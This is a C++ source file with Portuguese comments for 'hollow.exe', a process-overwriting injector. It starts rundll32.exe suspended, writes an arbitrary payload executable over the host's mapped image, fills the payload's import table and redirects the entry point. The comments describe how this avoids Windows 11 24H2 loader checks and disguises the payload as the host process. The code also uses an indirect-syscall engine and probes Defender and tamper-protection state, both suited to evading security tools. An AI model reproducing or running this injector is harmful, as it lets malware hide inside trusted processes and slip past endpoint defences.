// ---------------------------------------------------------------------------
// hollow.exe — Process Overwriting (variante moderna de Process Hollowing)
//
// Rodape tecnico: no Windows 11 24H2 o loader passou a chamar
//   LdrpInitializeProcess -> LdrpProcessMappedModule
//     -> RtlpInsertOrRemoveScpCfgFunctionTable -> ZwQueryVirtualMemory
//        (MemoryImageExtensionInformation)
// Essa classe de informacao so' aceita regiao image-backed (MEM_IMAGE). Um
// payload escrito em memoria privada (RunPE classico) faz a query falhar com
// STATUS_INVALID_ADDRESS e o processo morre com 0xC0000141. Com Memory
// Integrity ligado aparece ainda 0xC00004AC em NtManageHotPatch.
//
// Aqui o payload sobrescreve a imagem ja mapeada do host, sem unmap: as paginas
// continuam MEM_IMAGE, PEB->ImageBaseAddress nao muda, GetProcessImageFileName
// segue devolvendo o caminho do host, e o loader inicializa a nossa imagem
// normalmente no resume. Restricao: SizeOfImage(payload) <= SizeOfImage(host).
// ---------------------------------------------------------------------------
#include "nt.h"
#include "syscalls.h"
#include "pe.h"
#include "defense.h"

#include <shellapi.h>

#include <cstdio>
#include <string>
#include <vector>

namespace {

std::string Narrow(const std::wstring& w)
{
    if (w.empty()) return {};
    int n = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), static_cast<int>(w.size()),
                                nullptr, 0, nullptr, nullptr);
    std::string s(static_cast<size_t>(n), '\0');
    WideCharToMultiByte(CP_UTF8, 0, w.c_str(), static_cast<int>(w.size()),
                        s.data(), n, nullptr, nullptr);
    return s;
}

bool RemoteRead(HANDLE h, ULONG_PTR addr, void* buf, SIZE_T n)
{
    SIZE_T got = 0;
    NTSTATUS st = Sys().NtReadVirtualMemory(h, reinterpret_cast<const void*>(addr), buf, n, &got);
    return NT_SUCCESS(st) && got == n;
}

bool RemoteWrite(HANDLE h, ULONG_PTR addr, const void* buf, SIZE_T n)
{
    SIZE_T put = 0;
    NTSTATUS st = Sys().NtWriteVirtualMemory(h, reinterpret_cast<void*>(addr), buf, n, &put);
    return NT_SUCCESS(st) && put == n;
}

bool Protect(HANDLE h, ULONG_PTR addr, SIZE_T n, DWORD prot)
{
    void* a = reinterpret_cast<void*>(addr);
    SIZE_T sz = n;
    ULONG old = 0;
    return NT_SUCCESS(Sys().NtProtectVirtualMemory(h, &a, &sz, prot, &old));
}

std::wstring ExeDir()
{
    wchar_t buf[MAX_PATH]{};
    GetModuleFileNameW(nullptr, buf, MAX_PATH);
    std::wstring p(buf);
    size_t s = p.find_last_of(L"\\/");
    return (s == std::wstring::npos) ? L"." : p.substr(0, s);
}

void Usage()
{
    printf(
        "hollow.exe [opcoes]\n"
        "  --host <exe>       processo hospedeiro (default: %%WINDIR%%\\System32\\rundll32.exe)\n"
        "  --payload <exe>    imagem a ser implantada (default: payload.exe ao lado)\n"
        "  --no-defender      compatibilidade (Defender nunca e alterado)\n"
        "  --dry-run          valida payload PE sem iniciar processos nem alterar o sistema\n"
        "\n"
        "O payload precisa ter SizeOfImage <= SizeOfImage do host.\n");
}

bool OverwriteImage(HANDLE hProc, const Payload& pl, ULONG_PTR hostBase)
{
    IMAGE_DOS_HEADER hdos{};
    if (!RemoteRead(hProc, hostBase, &hdos, sizeof(hdos)) ||
        hdos.e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[!] nao consegui ler os headers do host\n");
        return false;
    }
    IMAGE_NT_HEADERS64 hnt{};
    if (!RemoteRead(hProc, hostBase + hdos.e_lfanew, &hnt, sizeof(hnt)) ||
        hnt.Signature != IMAGE_NT_SIGNATURE) {
        printf("[!] host sem PE valido em %p\n", reinterpret_cast<void*>(hostBase));
        return false;
    }
    if (hnt.OptionalHeader.SizeOfImage < pl.size) {
        printf("[!] payload (%lu bytes) maior que a imagem do host (%lu bytes)\n",
               static_cast<unsigned long>(pl.size),
               static_cast<unsigned long>(hnt.OptionalHeader.SizeOfImage));
        printf("    escolha outro host com imagem maior\n");
        return false;
    }

    auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(pl.image);
    auto* nt  = reinterpret_cast<IMAGE_NT_HEADERS64*>(pl.image + dos->e_lfanew);

    // headers
    if (!Protect(hProc, hostBase, nt->OptionalHeader.SizeOfHeaders, PAGE_READWRITE) ||
        !RemoteWrite(hProc, hostBase, pl.image, nt->OptionalHeader.SizeOfHeaders)) {
        printf("[!] falha ao escrever os headers\n");
        return false;
    }

    // secoes: escreve em RW e restaura a protecao natural de cada uma
    auto* sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        SIZE_T vsz   = sec[i].Misc.VirtualSize;
        SIZE_T rawsz = sec[i].SizeOfRawData;
        SIZE_T n     = (vsz > rawsz) ? vsz : rawsz;
        if (!n) continue;

        ULONG_PTR at = hostBase + sec[i].VirtualAddress;
        if (static_cast<SIZE_T>(sec[i].VirtualAddress) + n > pl.size) {
            printf("[!] secao %.8s excede SizeOfImage\n", sec[i].Name);
            return false;
        }

        if (!Protect(hProc, at, n, PAGE_READWRITE) ||
            !RemoteWrite(hProc, at, pl.image + sec[i].VirtualAddress, n)) {
            printf("[!] falha ao escrever a secao %.8s\n", sec[i].Name);
            return false;
        }
        Protect(hProc, at, n, SectionProtection(sec[i].Characteristics));
    }
    return true;
}

// Resolve a IAT do payload dentro do processo alvo.
//
// Necessario porque nao ha' garantia de que o loader va' processar a nossa
// imagem: se a inicializacao do processo ja' tiver acontecido no
// CreateProcess(CREATE_SUSPENDED), ninguem refaz os imports e o primeiro
// `call [__imp_WinExec]` cai num ponteiro nulo. Fazendo aqui, funciona nos dois
// cenarios (loader roda depois, ou nao roda).
bool ResolveImports(HANDLE hProc, const Payload& pl, ULONG_PTR base)
{
    auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(pl.image);
    auto* nt  = reinterpret_cast<IMAGE_NT_HEADERS64*>(pl.image + dos->e_lfanew);
    auto& dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (!dir.VirtualAddress || !dir.Size) return true;   // sem imports

    auto* imp = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(pl.image + dir.VirtualAddress);

    for (; imp->Name; ++imp) {
        const char* dll = reinterpret_cast<const char*>(pl.image + imp->Name);

        HMODULE h = LoadLibraryA(dll);
        if (!h) {
            printf("[!] LoadLibrary(%s) falhou\n", dll);
            return false;
        }

        ULONG_PTR thunkRva = imp->OriginalFirstThunk ? imp->OriginalFirstThunk
                                                     : imp->FirstThunk;
        auto* names = reinterpret_cast<IMAGE_THUNK_DATA64*>(pl.image + thunkRva);
        ULONG_PTR iatRva = imp->FirstThunk;

        // conta as entradas e abre a pagina da IAT para escrita (ela vem RO)
        ULONG_PTR count = 0;
        while (names[count].u1.AddressOfData) ++count;
        if (!count) continue;

        if (!Protect(hProc, base + iatRva, (count + 1) * sizeof(ULONG_PTR),
                     PAGE_READWRITE)) {
            printf("[!] falha ao abrir a IAT de %s\n", dll);
            return false;
        }

        for (ULONG_PTR i = 0; i < count; ++i) {
            ULONG_PTR target = 0;

            if (names[i].u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
                target = reinterpret_cast<ULONG_PTR>(
                    GetProcAddress(h, reinterpret_cast<LPCSTR>(
                        names[i].u1.Ordinal & 0xFFFF)));
            } else {
                auto* hint = reinterpret_cast<IMAGE_IMPORT_BY_NAME*>(
                    pl.image + names[i].u1.AddressOfData);
                target = reinterpret_cast<ULONG_PTR>(
                    GetProcAddress(h, reinterpret_cast<const char*>(hint->Name)));
            }
            if (!target) return false;

            if (!RemoteWrite(hProc, base + iatRva + i * sizeof(ULONG_PTR),
                             &target, sizeof(target))) {
                printf("[!] falha ao escrever IAT de %s\n", dll);
                return false;
            }
        }
    }
    return true;
}

// Se a thread primaria esta parada em LdrInitializeThunk, o proprio loader
// inicializa a imagem que escrevemos (imports/relocs) e salta para o entry
// dela. Se apontar para outro lugar, ajustamos manualmente.
bool PatchEntry(HANDLE hThread, const Payload& pl, ULONG_PTR hostBase)
{
    CONTEXT ctx{};
    ctx.ContextFlags = CONTEXT_CONTROL;
    if (!GetThreadContext(hThread, &ctx)) return false;

    void* ldrInit = reinterpret_cast<void*>(
        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "LdrInitializeThunk"));

    if (ldrInit && reinterpret_cast<void*>(static_cast<ULONG_PTR>(ctx.Rip)) != ldrInit) {
        ctx.Rip = hostBase + pl.entryRva;
        if (!SetThreadContext(hThread, &ctx)) return false;
        printf("[*] entry ajustado manualmente (Rip != LdrInitializeThunk)\n");
    }
    return true;
}

} // namespace

int main()
{
    int argc = 0;
    LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    if (!argv) { printf("[!] CommandLineToArgvW falhou\n"); return 2; }

    const std::wstring dir = ExeDir();
    std::wstring host        = L"C:\\Windows\\System32\\rundll32.exe";
    std::wstring payloadPath = dir + L"\\payload.exe";

    bool dryRun     = false;

    for (int i = 1; i < argc; ++i) {
        std::wstring a = argv[i];
        if (a == L"--no-defender")      { /* flag legada: sem alteracoes de protecao */ }
        else if (a == L"--dry-run")     dryRun = true;
        else if (a == L"--help" || a == L"-h") { Usage(); LocalFree(argv); return 0; }
        else if (a == L"--host"    && i + 1 < argc) host = argv[++i];
        else if (a == L"--payload" && i + 1 < argc) payloadPath = argv[++i];
        else { printf("[!] argumento desconhecido: %s\n", Narrow(a).c_str()); Usage();
               LocalFree(argv); return 2; }
    }
    LocalFree(argv);

    printf("hollow — process overwriting (24H2-safe)\n");
    printf("  host    : %s\n", Narrow(host).c_str());
    printf("  payload : %s\n", Narrow(payloadPath).c_str());

    // --- estado do endpoint ------------------------------------------------
    DefState ds = QueryDefender();
    printf("  admin   : %s\n", ds.elevated ? "sim" : "nao");
    printf("  tamper  : %s\n",
           ds.tamper < 0 ? "desconhecido" : (ds.tamper ? "LIGADO" : "desligado"));
    printf("  winDefnd: %s | realtime: %s\n",
           ds.serviceRunning ? "rodando" : "parado",
           ds.rtOff ? "off" : "on");

    // Nunca modificar configuracoes de protecao do endpoint automaticamente.
    // O estado consultado acima e apenas diagnostico.

    // --- payload -----------------------------------------------------------
    Payload pl;
    if (!LoadPayload(payloadPath.c_str(), pl, 0)) {
        printf("[!] payload rejeitado (%s): %s\n", g_peError, Narrow(payloadPath).c_str());
        return 1;
    }
    printf("[*] payload: SizeOfImage=%lu entry=+0x%lx sections=%u\n",
           static_cast<unsigned long>(pl.size),
           static_cast<unsigned long>(pl.entryRva),
           static_cast<unsigned>(pl.sections));

    if (dryRun) { printf("[*] dry-run: payload validado; nenhum processo criado ou defesa alterada\n"); return 0; }

    // --- motor de syscall --------------------------------------------------
    if (!SysInit()) {
        printf("[!] falha ao inicializar o motor de syscall (gadget/SSN)\n");
        return 1;
    }
    unsigned stubs = 0; void* gadget = nullptr;
    SysStats(&stubs, &gadget);
    printf("[*] syscalls: %u stubs | gadget=%p\n", stubs, gadget);



    // --- spawn -------------------------------------------------------------
    STARTUPINFOW si{};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi{};
    if (!CreateProcessW(host.c_str(), nullptr, nullptr, nullptr, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW,
                        nullptr, dir.c_str(), &si, &pi)) {
        printf("[!] CreateProcess falhou: %lu\n", GetLastError());
        return 1;
    }
    printf("[*] host suspenso pid=%lu\n", pi.dwProcessId);

    PROCESS_BASIC_INFORMATION pbi{};
    if (!NT_SUCCESS(Sys().NtQueryInformationProcess(pi.hProcess, 0, &pbi,
                                                    sizeof(pbi), nullptr))) {
        printf("[!] NtQueryInformationProcess falhou\n");
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    ULONG_PTR peb = reinterpret_cast<ULONG_PTR>(pbi.PebBaseAddress);

    ULONG_PTR hostBase = 0;
    if (!RemoteRead(pi.hProcess, peb + kPebImageBase, &hostBase, sizeof(hostBase))) {
        printf("[!] nao consegui ler o ImageBaseAddress do host\n");
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    printf("[*] host ImageBase=%p\n", reinterpret_cast<void*>(hostBase));

    // recarrega com relocations para o base real
    if (!LoadPayload(payloadPath.c_str(), pl, hostBase)) {
        printf("[!] payload nao relocavel para %p (imagem /FIXED?)\n",
               reinterpret_cast<void*>(hostBase));
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    // --- overwrite + resume -------------------------------------------------
    if (!OverwriteImage(pi.hProcess, pl, hostBase)) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }
    printf("[*] imagem sobrescrita (paginas seguem MEM_IMAGE)\n");

    if (!ResolveImports(pi.hProcess, pl, hostBase)) {
        printf("[!] falha ao resolver a IAT do payload\n");
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }
    printf("[*] IAT do payload preenchida\n");

    if (!PatchEntry(pi.hThread, pl, hostBase)) {
        printf("[!] SetThreadContext falhou: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 1;
    }

    ResumeThread(pi.hThread);
    printf("[*] thread liberada — payload em execucao\n");

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
